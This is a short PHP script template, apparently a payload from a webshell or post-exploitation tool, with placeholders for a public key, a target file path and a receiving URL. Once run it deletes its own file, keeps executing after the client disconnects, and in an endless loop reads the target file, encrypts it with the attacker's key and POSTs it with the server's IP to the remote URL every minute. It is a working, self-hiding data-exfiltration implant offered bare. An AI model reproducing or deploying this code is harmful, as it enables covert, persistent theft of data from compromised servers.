<?php
set_time_limit(0);
ignore_user_abort(1);
unlink(__FILE__);
function encrypt($content) {
    $pub = openssl_pkey_get_public("%publicKey%");
    openssl_public_encrypt($content, $encrypted, $pub);
    return base64_encode($encrypted);
}
function post($url, $data) {
    $data = array("data" => $data, "ip" => $_SERVER['SERVER_ADDR']);
    $context = stream_context_create(array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-type: application/x-www-form-urlencoded",
            'content' => http_build_query($data),
            'timeout' => 20,
        ),
    ));
    file_get_contents($url, false, $context);
}
while (1) {
    try {
        $content = file_get_contents("%path%");
        $content = encrypt($content);
        post("%recvUrl%", $content);
        sleep(60);
    } catch (Exception $e) {
    }
}
?>
